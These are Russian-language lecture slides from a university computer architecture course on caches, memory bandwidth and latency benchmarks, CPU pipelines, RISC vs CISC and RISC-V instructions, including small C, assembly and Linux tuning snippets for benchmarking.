L1 кэш               Блок 64 байта       На кристалле, L1                       1    Аппаратура
L2 кэш               Блок 64 байта       На/вне кристалла, L2                  10    Аппаратура
Буфер ввода/вывода   Части файлов        Оперативная память                   100    ОС

Кэш диска            Сектора диска       DRAM-память,                     100,000 Контроллер +
                                         размещенная на диске                     Прошивка диска
Сетевой кэш          Части файлов        Локальный диск                10,000,000    AFS/NFS клиент


Кэш браузера         Веб-страницы        Локальный диск                10,000,000    Веб браузер


Веб-кэш              Веб-страницы        Диск на удаленном           1,000,000,000   Веб-прокси
                                         сервере                                     сервер
                                                                                            15
                                                               © 2024 МГУ/ВМК/СП




                     Кэш памяти

• Кэш оперативной памяти – небольшая, быстрая память
  (SRAM). Управление кэшем аппаратное.
   – Хранит в себе часто используемые блоки оперативной памяти
• ЦПУ сперва ищет требуемые данные в кэше (L1, L2 и L3), и
  только потом в оперативной памяти.

      ЦПУ
                  Регистры

        Кэш                  АЛУ
                                   Системная
                                     шина    Шина памяти


                                                           Оперативная
         Интерфейс шины               Мост                   память
                                                                      16
                                                                      © 2024 МГУ/ВМК/СП




            Организация кэша (S, E, B)
                             E = 2e строк в наборе

                                                              набор
                                                            строка



S = 2s
наборов
(sets)




                                                     Размер кэша:
                v     tag   0 1 2        B-1         C = S x E x B байт

          Бит валидности                                                     17
                              Данные: B = 2b байт в блоке
                                                                               © 2024 МГУ/ВМК/СП




                Чтение данных из кэша •• Определяем номер набора
                                         Проверяем на совпадение
                                                         тега по всем строкам
                            E = 2e строк в наборе      • «Да» + v →попадание
                                                       • По смещению выбираем
                                                         данные


                                                           Адрес:
                                                             t бит     s бит       b бит

S = 2s                                                        тег           Смещение
наборов                                                              Номер     внутри
                                                                     набора     блока




                                                             Данные расположены по
                                                             указанному смещению

               v     tag   0 1 2         B-1

          Бит валидности                                                              18
                             Данные: B = 2b байт в блоке
                                                              © 2024 МГУ/ВМК/СП




  Пример: Кэш прямого отображения (E = 1)
  Прямое отображение: одна строка в наборе
  Для данного примера: размер блока 8 байт



                                             Адрес:
             v     tag    0 1 2 3 4 5 6 7
                                               t бит   0…01      100

             v     tag    0 1 2 3 4 5 6 7
                                                  Определяем номер
S = 2s                                            набора
наборов      v     tag    0 1 2 3 4 5 6 7




             v     tag    0 1 2 3 4 5 6 7




                                                                     20
                                                                         © 2024 МГУ/ВМК/СП




  Пример: Кэш прямого отображения (E = 1)
  Прямое отображение: одна строка в наборе
  Для данного примера: размер блока 8 байт



                                                        Адрес
Данные валидны? +    сравниваем: «да» - попадание
                                                          t бит   0…01      100

             v      tag    0 1 2 3 4 5 6 7


                                                    Смещение внутри блока




                                                                                21
                                                                         © 2024 МГУ/ВМК/СП




  Пример: Кэш прямого отображения (E = 1)
  Прямое отображение: одна строка в наборе
  Для данного примера: размер блока 8 байт



                                                        Адрес
Данные валидны? +    сравниваем: «да» - попадание
                                                          t бит   0…01      100

             v      tag    0 1 2 3 4 5 6 7


                                                    Смещение внутри блока


                               int (4 байта)



   Тег не совпал: строка вытесняется из кэша
                                                                                22
                                                                 © 2024 МГУ/ВМК/СП




      Моделируем кэш прямого отображения
t=1    s=2   b=1    M=16 адресуемых байтов, B=2 байта в блоке,
 x      xx    x     S=4 наборов, E=1 блок в наборе

                    Последовательность (трасса)
                    запрашиваемых адресов (чтение одного байта):
                           0      [00002],         промах
                           1      [00012],         попадание
                           7      [01112],         промах
                           8      [10002],         промах
                           0      [00002]          промах

                         v   Тег    Блок
               Набор 0   0
                         1    1?
                              0       ?
                                    M[8-9]
                                    M[0-1]
               Набор 1   0     ?      ?
               Набор 2   0     ?      ?
               Набор 3   0
                         1    0?      ?
                                    M[6-7]                              23
                                                                    © 2024 МГУ/ВМК/СП




   N-канальный ассоциативный кэш (N = 2)
N = 2: Две строки в наборе
Кэшируются блоки по 8 байт               Адрес переменной типа short int
                                                         t бита   0…01     100



  v    tag   0 1 2 3 4 5 6 7   v   tag      0 1 2 3 4 5 6 7


  v    tag   0 1 2 3 4 5 6 7   v   tag      0 1 2 3 4 5 6 7          Ищем
                                                                     набор

  v    tag   0 1 2 3 4 5 6 7   v   tag      0 1 2 3 4 5 6 7




  v    tag   0 1 2 3 4 5 6 7   v   tag      0 1 2 3 4 5 6 7



                                                                           24
                                                                              © 2024 МГУ/ВМК/СП




          N-канальный ассоциативный кэш (N = 2)
    N = 2: Две строки в наборе
    Кэшируются блоки по 8 байт                       Адрес переменной типа short int
                                                                   t бит    0…01     100
                       Сравниваем оба тега

валидный? +     совпадение: «да» = попадание

      v       tag   0 1 2 3 4 5 6 7      v     tag     0 1 2 3 4 5 6 7




                                                     Смещение в блоке




                                                                                     25
                                                                              © 2024 МГУ/ВМК/СП




          N-канальный ассоциативный кэш (N = 2)
    N = 2: Две строки в наборе
    Кэшируются блоки по 8 байт                       Адрес переменной типа short int
                                                                    t бит   0…01     100
                       Сравниваем оба тега

валидный? +     совпадение: «да» = попадание

      v       tag   0 1 2 3 4 5 6 7      v     tag     0 1 2 3 4 5 6 7




                                                     Смещение в блоке

                    short int (2 байта)


    Совпадений нет:
    • Одна из строк будет вытеснена из кэша
    • Стратегии замещения строк: произвольная, самая «старая» (LRU), …               26
                                                                © 2024 МГУ/ВМК/СП




 Моделируем 2-канальный ассоциативный кэш

t=2   s=1   b=1      M=16 адресуемых байт, B=2 байта в блоке,
xx      x    x       S=2 набора, E=2 блока в наборе

                     Последовательность (трасса)
                     запрашиваемых адресов (чтение одного байта):
                                0         [00002],   промах
                                1         [00012],   попадание
                                7         [01112],   промах
                                8         [10002],   промах
                                0         [00002]    попадание

                                v   Тег      Блок
                  Набор 0   0
                            1       ?
                                    00     ?
                                           M[0-1]
                            0
                            1       10
                                    ?      M[8-9]
                                           ?
                            0
                            1       ?
                                    01     ?
                                           M[6-7]
                  Набор 1
                            0       ?      ?                           27
                                                                            © 2024 МГУ/ВМК/СП




              Полностью ассоциативный кэш
Все строки размещаются в одном наборе: S = 2s , S = 1  s = 0,
т.е. поле с номером набора отсутствует.                          Адрес переменной
Адрес разделяется на тег и смещение внутри блока                       типа short int
                                                                   t бита          100

   v    tag    0 1 2 3 4 5 6 7        v    tag    0 1 2 3 4 5 6 7


   v    tag    0 1 2 3 4 5 6 7        v    tag    0 1 2 3 4 5 6 7


   v    tag    0 1 2 3 4 5 6 7        v    tag    0 1 2 3 4 5 6 7




   v    tag    0 1 2 3 4 5 6 7        v    tag    0 1 2 3 4 5 6 7


                                    Сравниваем тег, полученный из адреса,
Кэшируются блоки по 8 байт
                                    с полем тег каждой строки кэша                 28
                                                                                     © 2024 МГУ/ВМК/СП




                      Запись данных в память
• Несколько копий данных:
   – L1, L2, L3, оперативная память, диск
   – В многоуровневом кэше приходится решать, хранить ли копии данных на
     разных уровнях
       • Инклюзивность – на каждом уровне имеется своя копия
       • Эксклюзивность (исключительность) – на одном из уровней размещена единственная
         копия данных
• Как поступать при попадании?
   – Сквозная запись (пишем в память незамедлительно)
   – Отложенная запись (откладываем до момента вытеснения строки)
       • Требуется дополнительный бит-признак (dirty bit, грязный бит), что данные
         отличаются
• Как поступать при промахе?
   – Запись с размещением в кэше
       • Эффективно когда выполняется несколько записей в последовательные адреса
   – Запись без размещения в кэше
• Типичные комбинации политик управления кэшем
   – Сквозная запись + Запись без размещения
   – Отложенная запись + Запись с размещением                                               29
                                                                           © 2024 МГУ/ВМК/СП




    Пример: иерархия кэшей в Intel Core i7
Кристалл процессора                                           L1 i-кэш и d-кэш:
                                                                    32 KB, 8-канальный,
 Ядро 0                               Ядро 3                        Время доступа:
   регистры                                регистры                 4 такта

                                                              L2 общий кэш:
    L1          L1                          L1          L1         256 KB, 8-канальный,
   d-кэш      i-кэш                        d-кэш      i-кэш
                             …                                     Время доступа:
                                                                   11 тактов
    L2 общий кэш                            L2 общий кэш
                                                              L3 общий кэш:
                                                                   8 MB, 16-канальный,
                                                                   Время доступа:
                                                                   30-40 тактов
               Единый для всех ядер кэш L3
                                                              Размер блока:
                                                              64 байта у всех кэшей.

                      Оперативная память                                          30
                                                                      © 2024 МГУ/ВМК/СП




 Управление кэшем аппаратное (ну почти …)

• CLFLUSH m
   – Появилась в составе расширения SSE2
• Строки, содержащие ячейку памяти с указанным адресом,
  помечаются как невалидные
   – На всех уровнях иерархии кэш-памяти
   – Адрес может относиться как к данным, так и к командам
   – Если содержимое кэш и памяти различаются – содержимое кэш пишется в
     память

• Проблема: каждое ядро имеет свой L1 и L2 кэш, а следовательно –
  свои копии данных, извлеченные из памяти
   – Как гарантировать, что изменение данных в одном ядре будет своевременно
     доставлено другим ядрам?!
• Когерентность кэша
   – Целостность данных, хранящихся в локальных кэшах
   – Поддерживается аппаратурой


                                                                             31
                                                                    © 2024 МГУ/ВМК/СП




      Метрики производительности кэша

• Коэффициент промахов
   – Отношение количества промахов к общему числу обращений
     (промахи / обращения) = 1 – коэффициент попаданий
   – Характерные показатели (в процентах):
      • 3-10% для L1
      • Может быть достаточно малым ( < 1%) для L2, зависит от размера и
        т.д.
• Время попадания
   – Длительность извлечения данных из кэша
      • Включает время определения того, есть ли требуемые данные в кэше
   – Характерные показатели:
      • 1-2 тактов для L1
      • 5-20 тактов для L2
• Накладные расходы при промахе
   – Дополнительное время из-за промаха
      • Обычно 50-200 тактов для обращения к памяти


                                                                           32
                                                             © 2024 МГУ/ВМК/СП




  Что означают перечисленные показатели?

• Гигантская разница по времени промахов и попаданий
   – Два порядка, для L1 и оперативной памяти

• Пример: 99% попаданий вдвое более эффективно чем 97%
   – Характеристики:
     время попадания 1 такт
     накладные расходы при промахе 100 тактов

   – Среднее время доступа к элементу кэша:
   –   97% попаданий: 1 такт + 0.03 * 100 тактов = 4 такта
   –   99% попаданий: 1 такт + 0.01 * 100 тактов = 2 такта

• Поэтому «коэффициент неудач» используется вместо
  «коэффициента попаданий»
                                                                    33
                                                    © 2024 МГУ/ВМК/СП




          Дружественный к кэшу код

• В первую очередь целесообразно улучшать часто
  работающий код
  – Тела вложенных циклов, часто вызывающиеся функции


• Минимизировать промахи при обращении к кэшу
  в теле вложенного цикла
  – Повторяющеюся обращения к одним и тем же
    переменным (временная локальность)
  – Проход по массиву с шагом 1 (пространственная
    локальность)

                                                           34
                                                           © 2024 МГУ/ВМК/СП




                 Измерение времени
• В процессоре Pentium появился регистр 64-разрядный
  регистр TSC, подсчитывающий количество выполнившихся
  тактов
• Инструкция rdtsc считывает значение регистра TSC и
  заносит его в EDX:EAX section .rodata
• rdtsc может быть        format db ‘0x%08X 0x%08X’, 10, 0
  недоступна
  пользователям на       section .text
  некоторых              global CMAIN
  системах               CMAIN:
                            ...
                            rdtsc
                            mov     dword [esp + 8], eax
                            mov     dword [esp + 4], edx
                            mov     dword [esp], format
                            call    printf
                            ...                                   35
                                                                       © 2024 МГУ/ВМК/СП


                Синтетический микробенчмарк №1
              Оценка пропускной способности памяти
/* Оценочная функция */
void test(int elems, int stride) {
    int i, result = 0;
    volatile int sink;

      for (i = 0; i < elems; i += stride)
         result += data[i];
      sink = result;
}

/*
     Запуск test(elems, stride) и вычисление пропускной способности
     при чтении (МБ/с)
*/
double run(int size, int stride, double Mhz) {
    double cycles;
    int elems = size / sizeof(int);

      test(elems, stride);                     /* разогрев кэша */
      cycles = fcyc2(test, elems, stride, 0); /* вызываем test(elems,stride) */
      return (size / stride) / (cycles / Mhz); /* переводим кол-во циклов в МБ/с
*/                                                                            36
}
© 2024 МГУ/ВМК/СП




       37
                                                                   © 2024 МГУ/ВМК/СП




                           Don't Try This at Home
 Пропускная способность,
 чтение                                        Intel Pentium G4560 @ 3.50 ГГц
 МБ/с                                          8 ГБ оперативной памяти




                   шаг

Простой, ранее
рассмотренный
бенчмарк на настольных
компьютерах и серверах последних
поколений показывает «парадоксальные»
графики пропускной способности памяти :                Объем данных
пропускная способность изначально
крайне мала и начинает расти с                                            38
увеличением объема данных.
                                                                                     © 2024 МГУ/ВМК/СП




                             Неучтенные факторы

    • Пропуск тактов процессора (дросселированивание тактов, CPU
      throttling) – механизм снижения тактовой частоты процессора
            – Энергопотребление процессора P  C×V2×f,
              где С – электрическая ёмкость, V – питающее напряжение, f – частота
            – Снижение частоты снижает энергопотребление,
              а следовательно, и энерговыделение
                • Защита от перегрева
                • Экономия энергии, когда компьютер не занят выполнением программ,
                  требующих всех вычислительных возможностей
    • Современные процессоры способны динамически менять свою
      тактовую частоту
            – Снижение и восстановление частоты происходит не мгновенно, оно
              занимает сотни миллисекунд
            – Быстро отработавший бенчмарк не успевает дождаться
              восстановления штатной частоты процессора
#!/bin/sh          Как отключить в Linux пропуск тактов на всех ядрах процессора?
for CPUFREQ in /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor; do
   [ -f $CPUFREQ ] || continue; echo -n performance > $CPUFREQ;                             39
done
                                                            © 2024 МГУ/ВМК/СП




                Попытка №2, что я делаю не так?

   Пропускная способность,
   чтение, МБ/с




                                                                  Объем
                                                                  данных
          шаг


                                  Пропуск тактов отключен
                                  На графике исчезли «зубцы»
                                  Но «правильный» перепад в пропускной
Intel Pentium                     способности памяти так и не появился!
G4560 @ 3.50 ГГц                  Почему?                           40
8 ГБ оперативной памяти           Остались и другие неучтенные факторы
                                                                           © 2024 МГУ/ВМК/СП




             Микроархитектура процессора
                                   Программное
• Архитектура набора команд –       обеспечение       Прикладные программы
  интерфейс, который определяет,
  что могут делать программы                         Системные программы
• Микроархитектура определяет как это
  будет выполняться                                  Архитектура набора команд
• Разработчики аппаратуры стремятся                             (ISA)
  сохранить совместимость ISA и развить
  возможности микроархитектуры                              Микроархитектура
    – (Обратная) совместимость – возможность         Кэши            Многоядерность
      выполнять на новых моделях процессора           Предсказание     Упреждающая
      ранее написанные программы без каких-            переходов         выборка
      либо изменений                                             Управление энерго-
    – ISA можно дополнить новыми командами            Конвейер
                                                       команд
                                                                     потреблением

    – Развитие микроархитектуры улучшает
      важные для пользователя свойства                 Цифровой логический
      процессора
        •   Производительность                              уровень
        •   Энергопотребление           Аппаратное
        •   Безопасность               обеспечение     Физические устройства
        •   …
                                                                                      41
                                                                                                                                  © 2024 МГУ/ВМК/СП




                           Упреждающая выборка данных

      • Используемый бенчмарк обращается за данными
        строго последовательно, хоть и с различным шагом
      • Упреждающая выборка – микроархитектурный
        механизм для повышения производительности за
        счет извлечения инструкций и/или данных из памяти
        в кэш до того, как они фактически потребуются
              – В той модели процессора, на которой запускался бенчмарк,
                аппаратно реализовано 4 различных алгоритма
                упреждающей выборки



                                                                                                                                         42
https://software.intel.com/content/www/us/en/develop/articles/disclosure-of-hw-prefetcher-control-on-some-intel-processors.html
                                                                                     © 2024 МГУ/ВМК/СП




           Пропускная способность vs. Латентность

     • Попробуем измерить другую характеристику системы памяти,
       которую труднее «спрятать» микроархитектурными решениями
     • Пропускная способность памяти
           – Объем данных, который может быть передан из памяти за единицу времени.
             Если построить аналогию с трубопроводом – это ширина трубы
           – Микроархитектурные решения стремятся приблизить
             эту характеристику к пиковой величине
                 • Совокупность решений: расслоение памяти, многоканальность,
                   многоуровневое кэширование, упреждающая выборка, …
                 • Хорошо работают при «предсказуемых» обращениях в память,
                   таких как последовательный проход
                 • Ограничениями становятся пропускные способности шин и
                   модулей памяти
     • Латентность (задержка)
           – Время, которое затрачивается на чтение из памяти минимальной порции
             данных (одного слова). В примере с трубой – это длина трубопровода
           – Для оценки требуется обращаться в память по случайным адресам
     • Пропускная способность и латентность – относительно независимые
       друг от друга характеристики
Herb Sutter. Machine Architecture: Things Your Programming Language Never Told You          43
https://nwcpp.org/september-2007.html
                                                                                       © 2024 МГУ/ВМК/СП



               Синтетический микробенчмарк №2
                  Оценка латентности памяти
   • Измеряется время,                                               typedef struct Node Node;
     затрачиваемое на проход
     по однонаправленному списку                                     struct Node {
         – Элементы списка размещаются в памяти                         uint64_t payload;
           последовательно                                              Node* next;
         – Список «перемешивается», каждый элемент                   };
           ссылается на другой в произвольном порядке
         – Для снижения
           погрешностей измерения
           времени по небольшим
           спискам проходят
           несколько раз
   • Попытаемся измерить время доступа для
     списков разных размеров            for (Int it=0; it<iters; ++it) {
         – Проход по «перемешанному» списку                      Node* node = start_node;
         – Последовательный проход по списку                     while (node) {
         – Последовательный проход с                                node = node->next;
           отключенной упреждающей выборкой                      }
                                                             }
                                                                                              44
Бенчмарк построен на основе https://github.com/emilk/ram_bench
                                                                                  © 2024 МГУ/ВМК/СП




     Как отключить упреждающую выборку?

•   Каждая модель процессора может иметь свои микроархитектурные
    особенности
     –   Управлять ими через специализированные команды – крайне неудобно для
         разработчиков процессора, придется постоянно дорабатывать ISA
     –   Проще организовать управление через специальный набор управляющих и статусных
         регистров (Model specific register, MSR)
•   Моделезависимые регистры (MSR)
     –   Обращение к регистру по его номеру
     –   Чтение/запись – команды RDMSR и WRMSR, могут выполняться только операционной
         системой
     –   Разработчики процессоров имеют право свободно менять состав и поведение регистров
         от модели к модели
     –   На некоторые MSR доступна документация
     –   В Linux обратиться к MSR можно через специальные утилиты, названия которых
         повторяют имена соответствующих машинных команд
•   У используемой автором         # Устанавливаем пакет msr-tools
    слайдов модели                 sudo apt install msr-tools
    процессора                     # Загружаем ядерный модуль msr
    упреждающая выборка            modprobe msr
                                   # Для каждого процессорного ядра выполняем
    управляется                    # запись 4 единичек в младшие разряды MSR 0x1a4
    MSR 0x1a4                      wrmsr -p0 0x1a4 15
                                   wrmsr -p1 0x1a4 15                                    45
                                   ...
                                                                                © 2024 МГУ/ВМК/СП
Intel Pentium
G4560 @ 3.50 ГГц                                 ● Обращения в память в случайном порядке
8 ГБ оперативной памяти                          ● Последовательный проход по списку
                                                 ● Последовательный проход по списку
                                                   с отключенной предвыборкой данных

                      L1 – 32 КБ   L2 – 256 КБ     L3 – 3 МБ




                                                                                       46
Пропуск тактов отключен
                                                                                     © 2024 МГУ/ВМК/СП




                                      Выводы

•   Измерение даже простых характеристик компьютера требует учета многих
    факторов, без гарантий, что про все эти факторы найдется информация в
    открытых источниках (зеленая линия на графике)
     –   Отключены только пропуск тактов и упреждающая выборка. Последовательные
         обращения памяти замедлились на порядок, но все еще на порядок быстрее, чем
         обращения к произвольным адресам
•   Регулярные, последовательные, обращения к памяти могут сохранять
    высокую пропускную способность и латентность даже при потере
    локальности, благодаря комплексу дополняющих друг друга
    микроархитектурных решений (синяя линия на графике)
•   Латентность памяти скрыть гораздо тяжелей по ряду причин
     –   В частности, потому что память физически удалена от процессора
     –   Пример: 1ГГц, длительность 1 такта – 1 нс. За это время световой сигнал в вакууме
         успеет распространиться примерно на 30 см.
     –   Скорость распространения электрического сигнала в меди – 60-90% скорости света
     –   Необходимо передать в память команду на считывание, строб строки, строб столбца,
         получить обратно данные, …
•   Если данные не умещаются в кэш, то длительность произвольных обращений
    к ним микроархитектурные решения улучшить не в состоянии (красная линия
    на графике)
                                                                                             47
                                                  © 2024 МГУ/ВМК/СП




        Микроархитектурные решения

• Конвейер команд
  – Суперскалярная архитектура
  – Несколько параллельно работающих конвейеров
• Многоуровневое кэширование
  – Отдельные кэши для кода и данных
• Многоядерность
• Предсказание передачи управления (переходов)
• Упреждающая выборка кода и данных

• Микрокод
• Внеочередное выполнение команд

                                                         48
                                                © 2024 МГУ/ВМК/СП

 Конвейер – совмещение разных действий в
          один момент времени

• Общая для различный предметных областей методика
• Длительность обработки неизменна или несколько
  увеличивается
• Увеличение пропускной способности




                                                       49
                                                              © 2024 МГУ/ВМК/СП




    Упрощенная схема работы конвейера x86

1. (Fet) Извлечение инструкции из памяти
2. (Dec) Декодирование, обновление EIP
3. (D-F) Извлечение данных, подготовка операндов к выполнению
   операции
4. (Exe) Непосредственное выполнение операции
5. (Wrt) Запись результата

•   Для IA-32 такое модельное деление конвейера на этапы (стадии)
    обусловлено тем, что почти каждая команда способна работать с
    операндами различных типов: регистрами, константами и даже
    ячейками памяти.
•   Определение исполнительного адреса операнда, размещенного в
    памяти, в общем случае требует получения значений двух регистров
    и двух констант, одного умножения и двух сложений.



                                                                     50
                                                                © 2024 МГУ/ВМК/СП




        Организация конвейерных вычислений

                                  Задержка 320пс
                                  Пропускная способность 3.12 GIPS




                             Задержка 360пс
Для временного хранения
результатов работы каждой
                             Пропускная способность 8.33 GIPS
логической схемы требуются                                             51
служебные регистры
                                            © 2024 МГУ/ВМК/СП




Неоднородность ступеней конвейера




                  Задержка 510пс
                  Пропускная способность 5.88 GIPS




                                                   52
                                                    © 2024 МГУ/ВМК/СП




    Проблемы конвейерной организации

• Опустошение конвейера: сброс промежуточных
  результатов уже выполняющихся в конвейере команд
  – Процессоры могут содержать конвейеры длины 15 и более
    (P4 Prescott – 31 стадия конвейера)
  – Изменение EIP сбрасывает промежуточные результаты
    выполнения следующих инструкций
  – Возникновение исключительной ситуации при обращении к
    памяти или при выполнении операции над данными
• Зависимости по данным между «близко»
  расположенными командами
• Остановки из-за обращения к памяти
                                                           53
                                 © 2024 МГУ/ВМК/СП



Опустошение конвейера при передаче
           управления




                                        54
                                                              © 2024 МГУ/ВМК/СП




                Приостановка конвейера
Некоторые этапы не удается выполнить за один такт.




Одновременное выполнение нескольких команд требует учета
зависимостей по данным между командами: нельзя извлекать из регистра
значение, если предыдущая команда его туда еще не записала.



                                                                     55
                                                                             © 2024 МГУ/ВМК/СП



                  Двойной конвейер

• Двойной конвейер с общим этапом выборки команд
   – (Fet) Извлечение инструкции из памяти
   – (Dec) Декодирование, обновление EIP
   – (D-F) Извлечение данных
   – (Exe) Непосредственное выполнение операции
   – (Wrt) Запись результата
                                           U-конвейер способен выполнять любые команды




                    V-конвейер способен выполнять только простые команды, с «оглядкой» на
                                                                   состояние U-конвейера



• Впервые появился на Pentium: введены u- и v-конвейеры
• Возможности конвейеров неравноценны                   56
                                                                 © 2024 МГУ/ВМК/СП




          Суперскалярная и VLIW архитектуры
                                  • Многие операции над данными не могут
                                    быть реализованы за один такт.
                                  • В суперскалярной архитектуре
                                    выполняющиеся команды на стадии
                                    операции расходятся по нескольким
                                    функциональным устройствам (ФУ).
                                  • За распределение (планирование) потока
                                    команд по ФУ отвечает аппаратура
• Во VLIW-архитектуре (Very Long
                                    процессора.
  Instrictoin Word) каждая команда
  состоит из нескольких микрокоманд,
  независимо друг от друга,
  выполняющих операции над
  данными.
• За то, что бы команды действительно
  не конфликтовали между собой и
  могли выполняться параллельно,                                        57
  отвечает не процессор, а компилятор.
              © 2024 МГУ/ВМК/СП




Лекция 0x17


   8 мая
                                                           © 2024 МГУ/ВМК/СП




                          RISC vs CISC
          (Reduced vs Complex Instruction Set Computer)

• Исторически CISC предшествовал RISC
   – PDP-11  VAX / CISC, 1977 г.
   – MIPS, SPARC / RISC, конец 80-х
• Простые операции
   – Ограниченный набор простых команд (например, нет деления)
   – Команда выполняется за один такт
   – Фиксированная длина команды (простота декодирования)
• Конвейер
   – Каждая операция разбивается на однотипные простые этапы,
     которые выполняются параллельно
   – Каждый этап занимает 1 такт, в т.ч. декодирование
• Регистры
   – Много однотипных взаимозаменяемых регистров (могут
     использоваться и для данных, и для адресации)

                                                                   2
                                                        © 2024 МГУ/ВМК/СП




                       RISC vs CISC
        (Reduced vs Complex Instruction Set Computer)

• Модель работы с памятью
  – Отдельные команды для загрузки/сохранения в память
    Альтернативное название RISC-архитектур –
    Load/Store-машина
  – Команды обработки данных работают только с регистрами
• Результат
  – Устройство ядра процессора становится проще
     • Проще наращивать частоту процессора
     • Меньше энрергопотребление
  – По сравнению с CISC объем кода (число команд) при
    реализации того же алгоритма на RISC-машине будет
    больше
• Сложность оптимизаций перенесена из процессора в
  компилятор
  – Производительность сильно зависит от компилятора            3
                                                                              © 2024 МГУ/ВМК/СП




• Процессорная архитектура с открытым исходным кодом
   – Представлена в 2010 году, разработчик – Университет Беркли, при
     непосредственном участии Дэвида Паттерсона (Лекция 1, дополнительная
     литература)
   – Получила признание не только у ученых, но и в промышленности:
     Western Digital, Huawei, Alibaba Cloud, Hitachi, NVIDIA, Google, NXP, Samsung, …
   – Спецификация ISA публикуется RISC-V Foundation
     https://riscv.org/specifications/isa-spec-pdf/
   – Исходные коды процессорных ядер опубликовали десятки разработчиков:
     https://github.com/riscv/riscv-cores-list
     Языки разработки: Verilog, SystemVerilog, Chisel, VHDL и др.
• В 2019 г. в России порядка 10 центров разработки вели проекты с
  использованием RISC-V
   – Промышленный выпуск SoC (систем-на-чипе) в состав которых включен
     процессор RISC-V
   – Учебные и исследовательские проекты в МИЭТ, МФТИ, ИСП РАН, МГУ, ИТМО
• В 2023 г. создан российский Альянс RISC-V
   – https://riscv-alliance.ru/
   – https://t.me/risc_v_russia
                                                                                      4
                                                          © 2024 МГУ/ВМК/СП




      RISC-V: архитектура набора команд

• Две версии процессора: 32 и 64 разряда
• Характеристики RV 32 ISA
   – Машинное слово – 32 разряда. Такой размер имеют: адрес,
     регистры и размер команды.
   – 32 регистра общего назначения x0 – x31. Счетчик команд pc.
     x0 «запаян» всегда хранить 0, на записи не реагирует.
   – Базовый набор команд над целыми числами RV32I – 47
     команд. Только простые операции: сложение, вычитание,
     логика, сдвиги, сравнение, передача управления.
   – Большинство команд трехадресные.
   – Умножение, деление и взятие остатка вынесены в
     расширение набора команд RV32M, который необязателен
     для реализации, как и другие расширения.
   – Флагов состояний нет, аппаратной поддержки стека нет, как
     и многих других излишеств, например, команды MOV.
                                                                  5
        ADDI x28, x29, 0 ; пересылка из x29 в x28
                                                  © 2024 МГУ/ВМК/СП



            В чем RISC-V совсем не похож на x86
                Формат машинной команды
               Порядок байт

   • x86




       Переменная длина, от 1 до 15 байт.

   • RISC-V – всегда 4 байта, 4 простых формата
• Как сложить регистр с 32-х
  разрядной константой?
• Как обратиться к
  произвольному адресу                                    6
  памяти?!?
                                                             © 2024 МГУ/ВМК/СП



            В чем RISC-V совсем не похож на x86
                Формат машинной команды
     LUI x5, 0x12345           ; загружаем старшие 20 разрядов x5
     ADDI x5, x5, 0x678        ; заполняем младшие 12 разрядов x5

     LW     x5, 0xc(x6)        ; загружаем в x5 слово из памяти
                               ; по адресу x6+0xc
                               ; константа кодируется 12 бит
                               ; как получить произвольный базовый
                               ; адрес – см. пример выше


   • RISC-V – всегда 4 байта, 4 простых формата
• Как сложить регистр с 32-х
  разрядной константой?
• Как обратиться к
  произвольному адресу                                               7
  памяти?!?
                                                    © 2024 МГУ/ВМК/СП



           В чем RISC-V не похож на x86
         Сравнения и передача управления
• Безусловный переход
                   ; jump and link [register]
JAL x1, 0x12345    ; x1  pc + 4
                   ; pc  pc + ОП2 (20 разрядов)
JALR x1, x28, 0x20 ; x1  pc+4
                   ; pc  ОП2 + ОП3 (12 разрядов)

• Сравнения
SLT[U]   x28, x29, x30 ; if (ОП2 <[u] ОП3) {
                       ;    ОП1  1 } else {
                       ;    ОП1  0
                       ; }
• Условные переходы
BEQ   x28, x29, 0x10   ; if (ОП1 == ОП2) {
                       ;    pc  pc + (2 * ОП3)
                       ; } // ОП3 – 12 разрядов             8
                                                                         © 2024 МГУ/ВМК/СП




                         Конвейер RISC-V

• В каждой команде присутствует операция над данными из
  регистров
   – Если происходит обращение в память, исполнительный адрес
     получается сложением базового регистра и непосредственно
     закодированного значения
• Этапы конвейера RISC-V
   1.   Извлечение команды из памяти, увеличение pc на 4
   2.   Декодирование и извлечение значений операндов – регистров и
        непосредственно закодированной константы
   3.   Выполнение операции
        •   Если команда будет обращаться к памяти – вычисление адреса
   4.   Обращение к памяти
        (если команда работает с памятью)
   5.   Запись результата в регистр


                                                                                 9
                                                                            © 2024 МГУ/ВМК/СП




    Развитие x86 и некоторых RISC процессоров
                                      Процессорные архитектуры с открытым
                                      исходным кодом



   Процессорная архитектура MIPS




  32-х разрядная архитектура
  с защитой памяти
                   Внутреннее RISC-ядро
                   ISA не менялась

Процессорная архитектура x86                                                       10
                                       © 2024 МГУ/ВМК/СП



     Производительность: особенности
современной архитектуры Intel64 и не только
• Многоядерность
• Многоуровневый кэш,
  раздельный кэш кода и данных
• Суперскалярная архитектура
   – Несколько функциональных
     устройств, одновременно
     обслуживающих этап
     выполнения
• Векторные команды
  MMX, 3DNow!, SSE, ...
• Внеочередное выполнение
  команд
• Предсказание переходов
• Внутреннее RISC-ядро
• ...


                                              11
                                                © 2024 МГУ/ВМК/СП




      Развитие системы команд в архитектуре x86
    • 23 расширения команд в период 2011-2016
    • Значительная часть – системные команды,
      отвечающие за безопасность и изоляцию
      программ и данных
          – VT-x, VT-d / AMD-V
          – SGX
          – MPX / MPK
          – CET


Andrew Baumann (Microsoft Research).
Hardware is the new software. // 16th
Workshop on Hot Topics in Operating Systems,           12
May 2017
                                                                          © 2024 МГУ/ВМК/СП




                                         Микрокод

•   По мнению исследователя Andrew Baumann на
    протяжении нескольких лет аппаратное
    устройство процессоров Intel принципиально не
    менялось, для поддержки новых команд
    обновлялась его «прошивка» – микрокод
•   Микрокод — программа, реализующая набор
    инструкций процессора
•   Современные процессоры x86 динамически, на
    лету, транслируют команды x86 в микрокоманды
    (μops), которые выполняются внутренним RISC-
    ядром
     –   Подход применяется не только в x86 / Intel
     –   Удобно исправлять ошибки в поведении сложных
         команд и распространять эти исправления, т.е. новую
         версию микрокода (пакет linux-firmware)
     –   Удобно расширять набор команд
•   Идея микрокода была предложена еще на заре
    эпохи компьютеров
     –   M. V. Wilkes, J. B. Stringer. Microprogramming and the
         Design of the Control Circuits in an Electronic Digital
         Computer. // Proc. Cambridge Phil. Soc., pt. 2, vol. 49, April
         1953, pp. 230-238.                                                      13
                                           © 2024 МГУ/ВМК/СП




                 Что дальше?

• Режимы работы процессора x86
• Загрузка процессора, BIOS, UEFI и ACPI
• Что должно быть в процессоре, чтоб он смог
  одновременно обслуживать выполнение
  нескольких программ
• Модели памяти в x86 и механизмы защиты
• Страничная организация памяти, кэширование
  результатов трансляции адресов
